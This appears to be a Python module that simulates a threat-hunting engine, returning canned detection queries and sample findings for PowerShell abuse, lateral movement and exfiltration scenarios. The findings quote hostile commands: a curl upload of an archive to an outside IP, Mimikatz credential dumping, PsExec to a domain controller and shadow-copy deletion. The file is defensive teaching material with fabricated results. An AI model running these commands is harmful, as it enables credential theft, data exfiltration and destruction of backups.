import os
import json
from typing import Dict, Any, List

class ThreatHunterService:
    """
    Modular Threat Hunting AI Engine.
    Simulates proactive threat hunting workflows:
    Objective -> Hypothesis -> Telemetry Query -> Dialect Synthesis -> Findings & Report.
    """

    def __init__(self):
        self.knowledge_dir = os.path.join(os.path.dirname(__file__), "..", "..", "knowledge")
        self.scenarios_dir = os.path.join(os.path.dirname(__file__), "..", "..", "datasets", "threat-hunting")

    def run_hunt(self, threat_query: str) -> Dict[str, Any]:
        query_lower = threat_query.lower()

        # Determine Scenario Type based on query input
        if "lateral" in query_lower or "smb" in query_lower or "psexec" in query_lower:
            scenario_key = "2_lateral_movement"
            title = "Search Internal Lateral Movement"
            mitre_id = "T1021.002"
            tactic = "Lateral Movement"
            hypothesis = "Adversaries are leveraging administrative SMB shares (IPC$, ADMIN$) and remote WMI calls to move laterally across enterprise workstations."
            queries = {
                "sigma": "title: SMB Admin Share Lateral Movement\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        DestinationPort: 445\n        Image|endswith:\n            - '\\psexec.exe'\n            - '\\wmic.exe'\n    condition: selection",
                "kql": "DeviceNetworkEvents\n| where RemotePort == 445 and (InitiatingProcessFileName in (\"psexec.exe\", \"wmic.exe\", \"cmd.exe\"))\n| project TimeGenerated, DeviceName, RemoteIP, InitiatingProcessCommandLine",
                "splunk": "index=windows EventCode=5140 ShareName=\"*ADMIN$\" OR ShareName=\"*IPC$\"\n| table _time, ComputerName, SubjectUserName, SourceAddress, ShareName",
                "sql": "SELECT timestamp, src_ip, dest_ip, share_name, user FROM smb_session_events WHERE share_name IN ('ADMIN$', 'IPC$', 'C$');"
            }
            findings = [
                {
                    "title": "PsExec Service Creation on Domain Controller",
                    "severity": "CRITICAL",
                    "evidence": "psexec.exe \\\\dc-01.corp.local -u CORP\\Administrator -s cmd.exe",
                    "user": "CORP\\rdevon",
                    "host": "auth-gateway -> dc-01",
                    "mitre": "T1021.002"
                },
                {
                    "title": "WMI Remote Process Invocation",
                    "severity": "HIGH",
                    "evidence": "wmic.exe /node:10.0.4.88 process call create 'cmd.exe /c vssadmin delete shadows'",
                    "user": "CORP\\Administrator",
                    "host": "dc-01 -> finance-wkstn-04",
                    "mitre": "T1047"
                }
            ]
            quality_score = 92
            confidence = "94%"
        elif "exfiltration" in query_lower or "data" in query_lower or "upload" in query_lower or "7z" in query_lower:
            scenario_key = "3_data_exfiltration"
            title = "Detect Data Exfiltration & Staging"
            mitre_id = "T1041"
            tactic = "Exfiltration"
            hypothesis = "Sensitive corporate files are being archived into encrypted .7z packages in %TEMP% and exfiltrated over outbound HTTPS C2 channels."
            queries = {
                "sigma": "title: Staged Archive Data Exfiltration\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|endswith:\n            - '.7z'\n            - '.zip'\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\'\n    condition: selection",
                "kql": "DeviceFileEvents\n| where FolderPath contains \"\\\\Temp\\\\\" and (FileName endsWith \".7z\" or FileName endsWith \".zip\")\n| join kind=inner (DeviceNetworkEvents | where TransferredBytes > 10000000) on DeviceId\n| project TimeGenerated, DeviceName, FileName, RemoteIP, TransferredBytes",
                "splunk": "index=network (dest_port=443 OR dest_port=80) bytes_out>10000000\n| table _time, src_ip, dest_ip, bytes_out, http_user_agent",
                "sql": "SELECT timestamp, src_ip, dest_ip, bytes_sent, target_archive FROM network_exfiltration_events WHERE bytes_sent > 10000000 ORDER BY bytes_sent DESC;"
            }
            findings = [
                {
                    "title": "Local Archive Staging in %TEMP% Directory",
                    "severity": "HIGH",
                    "evidence": "7z.exe a -t7z -pP@ssw0rd2026 C:\\Users\\a.davis\\AppData\\Local\\Temp\\confidential_q3.7z",
                    "user": "CORP\\a.davis",
                    "host": "exec-laptop-01",
                    "mitre": "T1074.001"
                },
                {
                    "title": "High-Volume HTTPS Outbound Transfer (48.2 MB)",
                    "severity": "CRITICAL",
                    "evidence": "curl -X POST -F 'file=@confidential_q3.7z' https://185.220.101.5/upload/data",
                    "user": "CORP\\a.davis",
                    "host": "exec-laptop-01 -> 185.220.101.5",
                    "mitre": "T1041"
                }
            ]
            quality_score = 88
            confidence = "91%"
        else:
            # Default: PowerShell Abuse
            scenario_key = "1_powerShell_hunting"
            title = "Detect Obfuscated PowerShell Abuse"
            mitre_id = "T1059.001"
            tactic = "Execution"
            hypothesis = "Adversaries are executing obfuscated PowerShell scriptblocks (-EncodedCommand) to download remote payloads and dump LSASS memory."
            queries = {
                "sigma": "title: Suspicious PowerShell Execution\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\powershell.exe'\n        CommandLine|contains:\n            - '-EncodedCommand'\n            - '-Enc'\n            - 'Invoke-Mimikatz'\n    condition: selection",
                "kql": "DeviceProcessEvents\n| where ProcessCommandLine contains \"powershell\" and (ProcessCommandLine contains \"-Enc\" or ProcessCommandLine contains \"Invoke-Mimikatz\")\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
                "splunk": "index=windows EventCode=4688 Image=\"*powershell.exe\" (CommandLine=\"*-Enc*\" OR CommandLine=\"*Invoke-Mimikatz*\")\n| table _time, ComputerName, User, CommandLine",
                "sql": "SELECT timestamp, host, user, command_line FROM windows_process_events WHERE process_name = 'powershell.exe' AND (command_line LIKE '%-Enc%' OR command_line LIKE '%Invoke-Mimikatz%');"
            }
            findings = [
                {
                    "title": "Base64 Obfuscated PowerShell Scriptblock Execution",
                    "severity": "CRITICAL",
                    "evidence": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aW52b2tlLWV4cHJlc3Npb24...",
                    "user": "CORP\\jsmith",
                    "host": "finance-wkstn-04",
                    "mitre": "T1059.001"
                },
                {
                    "title": "LSASS Memory Credential Access Attempt",
                    "severity": "CRITICAL",
                    "evidence": "Invoke-Mimikatz -DumpCreds -Command privilege::debug sekurlsa::logonpasswords",
                    "user": "CORP\\jsmith",
                    "host": "finance-wkstn-04",
                    "mitre": "T1003.001"
                }
            ]
            quality_score = 95
            confidence = "97%"

        # Visual 5-Step Hunting Timeline
        timeline = [
            {
                "step": 1,
                "name": "Understanding Objective",
                "detail": f"Interpreted natural language input: '{threat_query}'. Identified core tactic: {tactic}.",
                "timestamp": "T+0.03s"
            },
            {
                "step": 2,
                "name": "Creating Hypothesis",
                "detail": hypothesis,
                "timestamp": "T+0.18s"
            },
            {
                "step": 3,
                "name": "Selecting Telemetry",
                "detail": "Queried Windows EVTX (4104/4688), Sysmon Event 1/3, and EDR network flow telemetry.",
                "timestamp": "T+0.41s"
            },
            {
                "step": 4,
                "name": "Generating Queries",
                "detail": "Synthesized multi-dialect detection logic (Sigma, KQL Sentinel, Splunk SPL, ANSI SQL).",
                "timestamp": "T+0.65s"
            },
            {
                "step": 5,
                "name": "Analyzing Results",
                "detail": f"Uncovered {len(findings)} suspicious operational behaviors matching MITRE technique {mitre_id}.",
                "timestamp": "T+0.88s"
            }
        ]

        # Telemetry Sources Status
        telemetry_sources = [
          {"name": "Windows Events (EVTX)", "status": "Connected", "active": True, "count": "1,420 events/sec"},
          {"name": "Network Traffic (Zeek/Suricata)", "status": "Connected", "active": True, "count": "8,950 packets/sec"},
          {"name": "DNS Query Logs", "status": "Connected", "active": True, "count": "3,100 queries/sec"},
          {"name": "Cloud Audit Logs (AWS/Azure)", "status": "Available", "active": False, "count": "Standby"}
        ]

        # Master's Level Teaching Points
        instructor_teaching_points = [
            {
                "title": "Threat Hunting vs. Reactive Alerting",
                "concept": "Hypothesis-Driven Security",
                "explanation": "Threat hunting starts with an active hypothesis based on adversary TTPs, assuming attackers have already bypassed perimeter signature filters without generating immediate alerts.",
                "key_takeaway": "Proactive hunting reduces adversary dwell time from months to hours."
            },
            {
                "title": "Multi-Dialect Query Translation",
                "concept": "Abstract Detection Engineering",
                "explanation": "AI converts human threat hypotheses into native SIEM dialects (KQL for Microsoft Sentinel, SPL for Splunk, Sigma for vendor-agnostic rules) seamlessly.",
                "key_takeaway": "AI eliminates dialect syntax friction, enabling analysts to focus on threat behavior."
            },
            {
                "title": "Human Validation of Hunting Hits",
                "concept": "Contextual Baseline Auditing",
                "explanation": "Administrative PowerShell or SMB access may be legitimate IT automation. Analysts must cross-reference findings against baseline user roles and change management schedules.",
                "key_takeaway": "AI detects anomalous patterns; human analysts validate business legitimacy."
            }
        ]

        return {
            "threat_query": threat_query,
            "title": title,
            "hypothesis": hypothesis,
            "quality_score": quality_score,
            "confidence": confidence,
            "mitre_id": mitre_id,
            "tactic": tactic,
            "queries": queries,
            "timeline": timeline,
            "telemetry_sources": telemetry_sources,
            "findings": findings,
            "instructor_teaching_points": instructor_teaching_points,
            "report": {
                "title": f"Threat Hunting Investigation Report: {title}",
                "hunting_id": f"HUNT-2026-{(abs(hash(threat_query)) % 8999) + 1000}",
                "objective": f"Proactively investigate environment for '{threat_query}'",
                "hypothesis": hypothesis,
                "data_sources_used": ["Windows EVTX Security Logs", "Sysmon Process & Network Telemetry", "Perimeter NetFlow"],
                "detection_logic_summary": f"Generated multi-dialect query targeting {mitre_id} ({tactic}).",
                "findings_summary": f"Discovered {len(findings)} confirmed threat behaviors across target hosts.",
                "mitre_mapping": {
                    "id": mitre_id,
                    "tactic": tactic,
                    "name": title
                },
                "recommended_actions": [
                    {
                        "priority": "P0 - Immediate",
                        "action": "Revoke compromised user session tokens and enforce mandatory credential reset.",
                        "type": "Identity Containment"
                    },
                    {
                        "priority": "P1 - High",
                        "action": "Deploy generated KQL / Sigma detection rule into production SIEM for continuous automated monitoring.",
                        "type": "Detection Engineering"
                    },
                    {
                        "priority": "P2 - Medium",
                        "action": "Conduct forensic memory dump on target host to audit secondary persistence vectors.",
                        "type": "Forensic Audit"
                    }
                ]
            }
        }

    def list_scenarios(self) -> List[Dict[str, str]]:
        return [
            {
                "key": "1_powerShell_hunting",
                "label": "Detect PowerShell Abuse",
                "query": "Find suspicious obfuscated PowerShell activity and scriptblock logging",
                "mitre": "T1059.001"
            },
            {
                "key": "2_lateral_movement",
                "label": "Search Lateral Movement",
                "query": "Look for possible internal SMB admin share lateral movement and PsExec",
                "mitre": "T1021.002"
            },
            {
                "key": "3_data_exfiltration",
                "label": "Detect Data Exfiltration",
                "query": "Detect local archive staging and high-volume outbound data transfer",
                "mitre": "T1041"
            }
        ]
